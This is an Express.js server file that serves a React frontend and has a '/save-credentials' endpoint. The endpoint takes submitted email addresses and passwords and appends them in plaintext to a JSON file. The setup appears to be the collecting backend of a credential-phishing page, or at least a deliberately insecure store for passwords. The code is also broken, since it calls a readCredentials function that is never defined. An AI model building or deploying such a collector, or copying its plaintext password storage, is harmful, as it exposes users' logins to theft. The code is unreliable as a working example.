import express from "express";
import fs from "fs/promises";
import cors from "cors";
import path from "path";

const app = express();
const PORT = process.env.PORT || 5000; // Use Azure's assigned port

// Middleware
app.use(cors());
app.use(express.json());

// Serve the built React frontend
const __dirname = path.resolve();
app.use(express.static(path.join(__dirname, "dist")));

app.get("*", (req, res) => {
  res.sendFile(path.join(__dirname, "dist", "index.html"));
});

// API Route to Save Credentials
app.post("/save-credentials", async (req, res) => {
  const { email, password } = req.body;
  if (!email || !password) {
    return res.status(400).json({ error: "Email and password are required." });
  }

  try {
    const credsFilePath = process.env.CREDENTIALS_PATH || path.resolve("server/credentials.json");
    const creds = await readCredentials();
    creds.push({ email, password });

    await fs.writeFile(credsFilePath, JSON.stringify(creds, null, 2));
    res.status(200).json({ message: "Credentials saved successfully!" });
  } catch (error) {
    console.error("Error writing file:", error);
    res.status(500).json({ error: "Failed to save credentials." });
  }
});

// Start the server
app.listen(PORT, () => {
  console.log(`Server running on port ${PORT}`);
});
